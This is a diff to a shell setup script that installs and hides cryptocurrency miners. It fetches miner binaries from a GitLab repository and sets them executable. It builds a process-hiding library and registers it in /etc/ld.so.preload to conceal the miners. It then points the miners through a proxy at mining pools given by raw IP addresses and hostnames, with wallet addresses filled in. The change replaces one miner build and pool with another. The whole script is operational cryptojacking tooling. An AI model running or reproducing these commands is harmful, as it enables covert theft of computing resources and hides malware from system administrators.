@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.82a
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
 
-chmod 777 lol1.82a
+chmod 777 lol1.84
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -57,5 +57,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.82a --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qrdgwjq2mydwswum0rkdlxgnyelamst53wxcj3dlc3z9jhx67745kmfzjk0rz.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
+./graftcp/graftcp /lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQBH1GWLmSiWGijeUD2QP6Ia5usZRj13XplHaSFvWoqq_NAA --pass x & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4
